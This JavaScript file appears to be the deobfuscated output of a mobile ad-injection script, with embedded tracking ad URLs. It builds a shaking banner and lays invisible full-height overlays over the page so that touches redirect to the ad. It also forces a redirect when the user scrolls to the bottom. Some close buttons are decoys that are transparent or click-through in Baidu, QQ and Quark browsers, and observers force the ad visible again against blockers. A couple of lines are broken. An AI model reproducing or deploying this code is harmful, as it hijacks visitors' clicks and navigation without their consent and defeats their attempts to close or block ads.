//Sat Apr 19 2025 08:53:55 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
(function (_0xa19cx1) {
  var _0xa19cx2;
  _0xa19cx1.idia = function (_0xa19cx3) {
    var _0xa19cx4 = Object.assign({}, _0xa19cx2.defaults, _0xa19cx3);
    return new _0xa19cx2(_0xa19cx4);
  };
  _0xa19cx2 = function (_0xa19cx3) {
    Object.assign(this, _0xa19cx3);
    let _0xa19cx5 = this;
    _0xa19cx5._shake();
    _0xa19cx5._init();
    _0xa19cx5._ancenganshuadiantan();
    _0xa19cx5._meta();
    setTimeout(() => {
      _0xa19cx5._swiperMonitor();
    }, 100);
    if (_0xa19cx5.anceng == 1) {
      _0xa19cx5._swiperSlideMonitor();
    }
    if (this.cnzz_link != 0) {
      this._cnzz_link();
    }
  };
  _0xa19cx2.prototype._swiperSlideMonitor = function () {
    let _0xa19cx5 = this;
    document.getElementById("anceng" + _0xa19cx5.random).style.display = "block";
  };
  _0xa19cx2.prototype._swiperMonitor = function () {
    const _0xa19cx5 = this;
    let _0xa19cx6 = Math.floor(Math.random() * 10);
    window.onscroll = () => {
      if (_0xa19cx5.bottom_activation === "True" && _0xa19cx6 < _0xa19cx5.bottom_activation_weight && (_0xa19cx5.bottom_activation_time_frame_state === "True" && _0xa19cx5._dateArr(_0xa19cx5.bottom_activation_time_frame).indexOf(new Date().getHours()) !== -1 || _0xa19cx5.bottom_activation_time_frame_state === "False")) {
        _0xa19cx5._scroll(_0xa19cx5.myNavigator.match(/qqbrowse/i) == "qqbrowse");
      }
    };
  };
  _0xa19cx2.prototype._ancenganshuadiantan = function () {
    const _0xa19cx5 = this;
    let _0xa19cx7 = document.getElementsByTagName("body")[0];
    _0xa19cx7.addEventListener("click", function (_0xa19cx8) {
      if (_0xa19cx8.target.id == "diantan" + _0xa19cx5.random) {
        if (_0xa19cx5.number == "0") {
          window.location.href = _0xa19cx5.hrefdt;
          document.getElementById("diantan" + _0xa19cx5.random).style.display = "none";
        } else {
          _0xa19cx5.number = "0";
          location.reload();
        }
      } else {
        if (_0xa19cx8.target.id == "alabelbox11" + _0xa19cx5.random) {
          document.getElementById("articleid" + _0xa19cx5.random).style.height = "0";
          document.getElementById("swipercontainer" + _0xa19cx5.random).style.display = "none";
          document.getElementById("alabelbox11" + _0xa19cx5.random).style.display = "none";
        } else {
          if (_0xa19cx8.target.id.indexOf("swipercontainer") != -1 && _0xa19cx8.target.id.indexOf(_0xa19cx5.random) != -1 || _0xa19cx8.target.id.indexOf("image") != -1 && _0xa19cx8.target.id.indexOf(_0xa19cx5.random) != -1) {
            window.location.href = _0xa19cx8.target.dataset.url;
          }
        }
      }
    });
    document.getElementById("articleid" + _0xa19cx5.random).addEventListener("touchend", function (_0xa19cx8) {
      if (_0xa19cx8.target.id.indexOf("anceng") != -1 || _0xa19cx8.target.id.indexOf("anshua") != -1) {
        if (_0xa19cx5.dark_activation_time_frame_state === "True" && _0xa19cx5._dateArr(_0xa19cx5.dark_activation_time_frame).indexOf(new Date().getHours()) !== -1 || _0xa19cx5.dark_activation_time_frame_state === "False") {
          if (_0xa19cx8.target.id.indexOf("anceng") != -1) {
            document.getElementById("anceng" + _0xa19cx5.random).style.display = "none";
          }
          window.location.href = _0xa19cx8.target.dataset.url;
        }
      }
    });
  };
  _0xa19cx2.prototype._append = function (_0xa19cx9) {
    document.write(this._setTemplate());
    document.getElementById("articleid" + this.random).appendChild(this._swiperSlide());
    this._iframeAncengAnshua();
    let _0xa19cxa = this.myNavigator.match(/baidu/i) == "baidu";
    let _0xa19cxb = this.myNavigator.match(/qqbrowse/i) == "qqbrowse";
    let _0xa19cxc = this.myNavigator.match(/quark/i) == "quark";
    if (_0xa19cxb || _0xa19cxc || _0xa19cxa) {
      this._observerSvg();
      this._svgFC(this.srcHrefArr[0].material, this.srcHrefArr[0].ad_url);
    } else {
      this._observerIframe();
    }
  };
  _0xa19cx2.prototype._setTemplateSvg = function () {
    let _0xa19cxd = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    _0xa19cxd.id = "svgid" + this.random;
    _0xa19cxd.setAttribute("width", document.body.clientWidth);
    _0xa19cxd.setAttribute("height", this.boxHeight);
    _0xa19cxd.style = "position:absolute;left:0;top:0;z-index:2147483645;margin:0;padding:0;border:0;width:100%;max-height:" + this.boxHeight + "px;height:" + this.boxHeight + "px;display:inline-block;";
    return _0xa19cxd;
  };
  _0xa19cx2.prototype._svgFC = function (_0xa19cxe, _0xa19cxf) {
    var _0xa19cx10 = document.createElementNS("http://www.w3.org/2000/svg", "image");
    _0xa19cx10.setAttributeNS(null, "height", this.boxHeight);
    _0xa19cx10.setAttributeNS(null, "width", "100%");
    _0xa19cx10.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", _0xa19cxe);
    _0xa19cx10.setAttributeNS(null, "preserveAspectRatio", "none");
    _0xa19cx10.setAttributeNS(null, "visibility", "visible");
    _0xa19cx10.setAttributeNS(null, "display", "inline");
    _0xa19cx10.setAttributeNS(null, "data-url", _0xa19cxf);
    _0xa19cx10.setAttributeNS(null, "id", "image" + this.random);
    document.getElementById("svgid" + this.random).appendChild(_0xa19cx10);
  };
  _0xa19cx2.prototype._iframeAncengAnshua = function () {
    let _0xa19cxa = this.myNavigator.match(/baidu/i) == "baidu";
    let _0xa19cxb = this.myNavigator.match(/qqbrowse/i) == "qqbrowse";
    let _0xa19cxc = this.myNavigator.match(/quark/i) == "quark";
    if (_0xa19cxb || _0xa19cxc || _0xa19cxa) {
      document.getElementById("swipercontainer" + this.random).appendChild(this._setTemplateSvg());
    } else {
      document.getElementById("swipercontainer" + this.random).appendChild(this._setTemplateFirame(this.srcHrefArr[0].material, this.id2, this.srcHrefArr[0].material_id));
    }
    if (this.anceng == 1) {
      document.getElementById("articleid" + this.random).appendChild(this._setTemplateAnceng(this.srcHrefArr[0].ad_url));
    }
    if (this.anshua == 1) {
      document.getElementById("swipercontainer" + this.random).appendChild(this._setTemplateAnshua(this.srcHrefArr[0].ad_url));
    }
  };
  _0xa19cx2.prototype._meta = function () {
    let _0xa19cx11 = document.getElementsByName("referrer");
    for (let _0xa19cx12 = 0; _0xa19cx12 < _0xa19cx11.length; _0xa19cx12++) {
      if (_0xa19cx11[_0xa19cx12].content === "origin") {
        return;
      }
    }
    var _0xa19cx13 = document.createElement("meta");
    _0xa19cx13.name = "referrer";
    _0xa19cx13.content = "origin";
    document.querySelector("head").appendChild(_0xa19cx13);
  };
  _0xa19cx2.prototype._init = function () {
    this._append();
  };
  _0xa19cx2.prototype._setTemplate = function () {
    let _0xa19cxa = this.myNavigator.match(/baidu/i) == "baidu";
    console.log(_0xa19cxa);
    let _0xa19cxb = this.myNavigator.match(/qqbrowse/i) == "qqbrowse";
    let _0xa19cxc = this.myNavigator.match(/quark/i) == "quark";
    let _0xa19cx14 = 0;
    if (_0xa19cxa || _0xa19cxb || _0xa19cxc) {
      _0xa19cx14 = 1;
    }
    let _0xa19cx15;
    this.diantan == "1" ? _0xa19cx15 = "block" : _0xa19cx15 = "none";
    return "<h1 id='h1placeholder " + Math.random() + "' style='padding:0;margin:0;border:0'></h1><article id='articleid" + this.random + "' class='O5E73" + this.random + " " + Math.random() + "' style='position: relative;display:block;width:100%;height:" + this.boxHeight + "px;-webkit-animation:shakegwegs" + this.random + " 2s 0.5s infinite;-moz-animation:shakegwegs " + this.random + " 2s 0.5s infinite;'><h6 id='alabelbox11" + this.random + "' style='margin:0;padding:0;font-weight: normal;position:absolute;left:0;top:0;z-index:2147483647;width: 18px;height: 18px;line-height: 18px;text-align: center;font-size: 12px;color: #fff;border: 1px solid #fff;box-sizing: border-box;border-radius: 5px;opacity:" + _0xa19cx14 + ";background: #f00 linear-gradient(90deg, #f00, #f00);'>✕</h6><div id='diantan" + this.random + "' style='z-index:2147483647;position:fixed;top:0;left:0;width:100vw;height:100vh;display:" + _0xa19cx15 + ";'></div></article>";
  };
  _0xa19cx2.prototype._setTemplateFirame = function (_0xa19cxe, _0xa19cx16, _0xa19cx17) {
    let _0xa19cxa = this.myNavigator.match(/baidu/i) == "baidu";
    let _0xa19cxb = this.myNavigator.match(/qqbrowse/i) == "qqbrowse";
    let _0xa19cxc = this.myNavigator.match(/quark/i) == "quark";
    let _0xa19cx14 = 1;
    if (_0xa19cxa || _0xa19cxb || _0xa19cxc) {
      _0xa19cx14 = 0;
    }
    let _0xa19cx18 = document.createElement("iframe");
    _0xa19cx18.id = "iframeid" + this.random;
    _0xa19cx18.frameborder = 0;
    _0xa19cx18.style = "position:absolute;left:0;top:0;z-index:2147483645;margin:0;padding:0;border:0;width:100%;max-height:" + this.boxHeight + "px;height:" + this.boxHeight + "px;display:block;pointer-events: none;";
    _0xa19cx18.srcdoc = "<div style='display: flex;width:100%;height:100%'><div style='display:block;position: fixed;bottom:0;left:0;color:#000;z-index:2147483647;font-size: 12px;pointer-events: none;'>" + _0xa19cx17 + "-" + _0xa19cx16 + "</div><div style='position:fixed;left:0;top:0;z-index:2147483647;width: 18px;height: 18px;line-height: 18px;text-align: center;font-size: 12px;color: #fff;border: 1px solid #fff;box-sizing: border-box;border-radius: 5px;opacity:" + _0xa19cx14 + ";background: #f00 linear-gradient(90deg, #f00, #f00);'>✕</div><div style='position:fixed;right:0;top:0;z-index:2147483647;width: 18px;height: 18px;line-height: 18px;text-align: center;font-size: 12px;color: #111;border: 1px solid #111;box-sizing: border-box;border-radius: 5px;opacity:" + _0xa19cx14 + ";background: #ccc linear-gradient(90deg, #ccc, #ccc);'>✕</div><img style='position:fixed;top:0;left:0;width:100%;height:" + this.boxHeight + "px;' src='" + _0xa19cxe + "' alt=''></div>";
    return _0xa19cx18;
  };
  _0xa19cx2.prototype._setTemplateCanvas = function (_0xa19cxf) {
    let _0xa19cx19 = document.createElement("canvas");
    _0xa19cx19.id = "canvasid" + this.random;
    _0xa19cx19.width = document.body.clientWidth;
    _0xa19cx19.height = this.boxHeight;
    _0xa19cx19.setAttribute("data-url", _0xa19cxf);
    _0xa19cx19.style = "position:absolute;left:0;top:0;z-index:2147483645;margin:0;padding:0;border:0;width:100% !important;max-height:" + this.boxHeight + "px !important;height:" + this.boxHeight + "px !important;display:inline !important;visibility: visible !important;";
    return _0xa19cx19;
  };
  _0xa19cx2.prototype._canvasFC = function (_0xa19cxe) {
    let _0xa19cx5 = this;
    var _0xa19cx1a = new Image();
    _0xa19cx1a.src = _0xa19cxe;
    _0xa19cx1a.onload = function () {
      var _0xa19cx1b = document.getElementById("canvasid" + _0xa19cx5.random).getContext("2d");
      _0xa19cx1b.drawImage(_0xa19cx1a, 0, 0, document.body.clientWidth, _0xa19cx5.boxHeight);
    };
  };
  _0xa19cx2.prototype._setTemplateAnceng = function (_0xa19cxf) {
    let _0xa19cx1c;
    this.anceng == "1" ? _0xa19cx1c = "block" : _0xa19cx1c = "none";
    let _0xa19cx1d;
    this.direction == "top" ? _0xa19cx1d = "bottom" : _0xa19cx1d = "top";
    let _0xa19cx1e = this.darkHeight * 0.01 * 40;
    let _0xa19cx1f = "0";
    this.num == 1 ? widthn = "100%" : widthn = "50%";
    let _0xa19cx20 = document.createElement("div");
    _0xa19cx20.id = "anceng" + this.random;
    _0xa19cx20.setAttribute("data-url", _0xa19cxf + "&slide_click=1");
    _0xa19cx20.style = "display:" + _0xa19cx1c + ";position:absolute;" + _0xa19cx1d + ":" + this.boxHeight + "px;left:" + _0xa19cx1f + ";z-index:2147483647;height:" + _0xa19cx1e + "vh;width:" + widthn + ";padding:0px'";
    return _0xa19cx20;
  };
  _0xa19cx2.prototype._setTemplateAnshua = function (_0xa19cxf) {
    let _0xa19cx21;
    this.anshua == "1" ? _0xa19cx21 = "block" : _0xa19cx21 = "none";
    let _0xa19cx20 = document.createElement("div");
    _0xa19cx20.id = "anshua" + this.random;
    _0xa19cx20.setAttribute("data-url", _0xa19cxf + "&slide_click=1");
    _0xa19cx20.style = "display:" + _0xa19cx21 + ";position:absolute;top:0px;left:0;z-index:2147483647;height:" + this.boxHeight + "px;width:100%;padding:0px'";
    return _0xa19cx20;
  };
  _0xa19cx2.prototype._observerIframe = function () {
    const _0xa19cx22 = document.getElementById("iframeid" + this.random);
    const _0xa19cx23 = {
      attributes: true,
      childList: true,
      subtree: true
    };
    const _0xa19cx9 = function (_0xa19cx24, _0xa19cx25) {
      for (let _0xa19cx26 of _0xa19cx24) {
        if (_0xa19cx26.type === "childList") {
          _0xa19cx22.style.display = "inline";
          _0xa19cx22.style.visibility = "visible";
        } else {
          if (_0xa19cx26.type === "attributes") {
            _0xa19cx22.style.display = "inline";
            _0xa19cx22.style.visibility = "visible";
          }
        }
      }
    };
    const _0xa19cx25 = new MutationObserver(_0xa19cx9);
    _0xa19cx25.observe(_0xa19cx22, _0xa19cx23);
  };
  _0xa19cx2.prototype._observerSvg = function () {
    const _0xa19cx22 = document.getElementById("svgid" + this.random);
    const _0xa19cx23 = {
      attributes: true,
      childList: true,
      subtree: true
    };
    const _0xa19cx9 = function (_0xa19cx24, _0xa19cx25) {
      for (let _0xa19cx26 of _0xa19cx24) {
        if (_0xa19cx26.type === "childList") {
          _0xa19cx22.style.display = "inline";
          _0xa19cx22.style.visibility = "visible";
        } else {
          if (_0xa19cx26.type === "attributes") {
            _0xa19cx22.style.display = "inline";
            _0xa19cx22.style.visibility = "visible";
          }
        }
      }
    };
    const _0xa19cx25 = new MutationObserver(_0xa19cx9);
    _0xa19cx25.observe(_0xa19cx22, _0xa19cx23);
  };
  _0xa19cx2.prototype._observerCanvas = function () {
    const _0xa19cx22 = document.getElementById("canvasid" + this.random);
    _0xa19cx22.style.display = "inline";
    _0xa19cx22.style.visibility = "visible";
    const _0xa19cx23 = {
      attributes: true,
      childList: true,
      subtree: true
    };
    const _0xa19cx9 = function (_0xa19cx24, _0xa19cx25) {
      for (let _0xa19cx26 of _0xa19cx24) {
        if (_0xa19cx26.type === "childList") {
          _0xa19cx22.style.display = "inline";
          _0xa19cx22.style.visibility = "visible";
        } else {
          if (_0xa19cx26.type === "attributes") {
            _0xa19cx22.style.display = "inline";
            _0xa19cx22.style.visibility = "visible";
          }
        }
      }
    };
    const _0xa19cx25 = new MutationObserver(_0xa19cx9);
    _0xa19cx25.observe(_0xa19cx22, _0xa19cx23);
  };
  _0xa19cx2.prototype._cnzz_link = function () {
    var _0xa19cx27 = document.createElement("script");
    _0xa19cx27.src = this.cnzz_link;
    a;
    document.body.insertBefore(_0xa19cx27, document.body.firstChild);
  };
  _0xa19cx2.prototype._shake = function () {
    const _0xa19cx28 = document.createElement("style");
    _0xa19cx28.type = "text/css";
    _0xa19cx28.innerHTML = ".swiper-container{.swiper-pagination-bullet{margin:0 10px}};";
    document.querySelector("head").appendChild(_0xa19cx28);
    if (this.shake == "1") {
      var _0xa19cx29 = "@-moz-keyframes shakegwegs" + this.random + "{0%{-moz-transform:scale(1.05)}10%,20%{-moz-transform:scale(0.95)rotate(-2.5deg)}30%,50%,70%,90%{-moz-transform:scale(1.05)rotate(2.5deg)}40%,60%,80%{-moz-transform:scale(1.05)rotate(-2.5deg)}100%{-moz-transform:scale(1.05)rotate(0)}}@-webkit-keyframes shakegwegs" + this.random + "{0%{-webkit-transform:scale(1.05)}10%,20%{-webkit-transform:scale(0.95)rotate(-2.5deg)}30%,50%,70%,90%{-webkit-transform:scale(1.05)rotate(2.5deg)}40%,60%,80%{-webkit-transform:scale(1.05)rotate(-2.5deg)}100%{-webkit-transform:scale(1.05)rotate(0)}}";
      const _0xa19cx2a = document.createElement("style");
      _0xa19cx2a.type = "text/css";
      _0xa19cx2a.innerHTML = _0xa19cx29;
      document.querySelector("head").appendChild(_0xa19cx2a);
    }
  };
  _0xa19cx2.prototype._swiperSlide = function () {
    const _0xa19cx20 = document.createElement("div");
    _0xa19cx20.setAttribute("data-url", this.srcHrefArr[0].ad_url);
    _0xa19cx20.className = "swiper-container";
    _0xa19cx20.id = "swipercontainer" + this.random;
    _0xa19cx20.style = "position: relative;z-index:2147483646;margin:0;padding:0;border:0;width:100%;max-height:" + this.boxHeight + "px;height:" + this.boxHeight + "px;display:block;";
    let _0xa19cxa = this.myNavigator.match(/baidu/i) == "baidu";
    let _0xa19cxb = this.myNavigator.match(/qqbrowse/i) == "qqbrowse";
    let _0xa19cxc = this.myNavigator.match(/quark/i) == "quark";
    if (_0xa19cxb || _0xa19cxc || _0xa19cxa) {
      _0xa19cx20.innerHTML = "<div style='position: absolute;bottom:0;left:0;color:#000;letter-spacing: 0;line-height: 12px;z-index:2147483647;font-size: 12px;pointer-events: none;'>" + this.srcHrefArr[0].material_id + "-" + this.id2 + "</div><h6 id='ababoxjia" + this.random + "' style='margin:0;padding:0;font-weight: normal;position:absolute;right:0;top:0;z-index:2147483647;width: 18px;height: 18px;line-height: 18px;text-align: center;font-size: 12px;color: #111;border: 1px solid #111;box-sizing: border-box;border-radius: 5px;background: #ccc linear-gradient(90deg, #ccc, #ccc);'>✕</h6>";
    }
    return _0xa19cx20;
  };
  _0xa19cx2.prototype._scroll = function (_0xa19cxb) {
    let _0xa19cx5 = this;
    let _0xa19cx2b = _0xa19cx5._getScrollTop();
    let _0xa19cx2c = document.documentElement.scrollHeight || document.body.scrollHeight;
    let _0xa19cx2d = document.documentElement.clientHeight;
    if (_0xa19cxb) {
      if (_0xa19cx2c - _0xa19cx2b - _0xa19cx2d < 100) {
        window.location.href = _0xa19cx5.srcHrefArr[0].ad_url + "&slide_click=1";
      }
    } else {
      if (_0xa19cx2c - _0xa19cx2b - _0xa19cx2d < 100 && _0xa19cx5.number2 == 0) {
        _0xa19cx5.number2 = 1;
        window.location.href = _0xa19cx5.srcHrefArr[0].ad_url + "&slide_click=1";
      }
    }
  };
  _0xa19cx2.prototype._getScrollTop = function () {
    var _0xa19cx2e;
    if (window.pageYOffset) {
      _0xa19cx2e = window.pageYOffset;
    } else {
      if (document.compatMode && document.compatMode != "BackCompat") {
        _0xa19cx2e = document.documentElement.scrollTop;
      } else {
        if (document.body) {
          _0xa19cx2e = document.body.scrollTop;
        }
      }
    }
    return _0xa19cx2e;
  };
  _0xa19cx2.prototype._dateArr = function (_0xa19cx2f) {
    let _0xa19cx30;
    let _0xa19cx31;
    if (_0xa19cx2f) {
      let _0xa19cx32 = _0xa19cx2f.split("-");
      _0xa19cx30 = +_0xa19cx32[0].split(":")[0];
      _0xa19cx31 = +_0xa19cx32[1].split(":")[0];
      let _0xa19cx33 = [];
      if (_0xa19cx30 < _0xa19cx31) {
        for (let _0xa19cx34 = _0xa19cx30; _0xa19cx34 < _0xa19cx31; _0xa19cx34++) {
          _0xa19cx33.push(_0xa19cx34);
        }
      } else {
        for (let _0xa19cx34 = _0xa19cx30; _0xa19cx34 <= 23; _0xa19cx34++) {
          _0xa19cx33.push(_0xa19cx34);
        }
        for (let _0xa19cx34 = 0; _0xa19cx34 < _0xa19cx31; _0xa19cx34++) {
          _0xa19cx33.push(_0xa19cx34);
        }
      }
      return _0xa19cx33;
    }
  };
  _0xa19cx2.defaults = {
    srcHrefArr: JSON.parse("[{\"ad_url\": \"https://sat19.ikka04191opq.com/a?akey=YJmAwrdzrazQpUM68mqdvh&wkey=ms9rNj4yTsLTvPSL4HgTAG&aid=3450&wid=1485&token=1673486360461370973&browser=Chrome\", \"material\": \"https://mip.mgppos.com/mh2/5958324770399_THbNdmV.gif\", \"material_id\": 3437}]"),
    hrefdt: "0",
    theme: "light",
    shake: "1",
    anceng: "1",
    anshua: "1",
    dark_activation_time_frame_state: "False",
    dark_activation_time_frame: "",
    diantan: "0",
    random: Math.ceil(Math.random() * 100000),
    number: "0",
    id: "ms9rNj4yTsLTvPSL4HgTAG",
    cnzz_link: "0",
    skip: "0",
    spaceBetween: 5,
    num: Number("1"),
    settime: Number("2") * 1000,
    delay: Number("1") * 1000,
    boxHeight: (0.3333333333333333 * document.body.clientWidth).toFixed(0),
    darkHeight: (0.05333333333333334 * document.body.clientWidth).toFixed(0),
    direction: "bottom",
    currentIndex: 1,
    id2: "1485",
    number2: 0,
    myNavigator: navigator.userAgent.toLowerCase(),
    bottom_activation: "True",
    bottom_activation_time_frame_state: "False",
    bottom_activation_time_frame: "",
    bottom_activation_weight: "4"
  };
  if (_0xa19cx2.defaults.skip == 0) {
    _0xa19cx1.idia();
  } else {
    window.location.href = _0xa19cx2.defaults.JSON.parse("{ads}")[0].ad_url;
  }
})(window);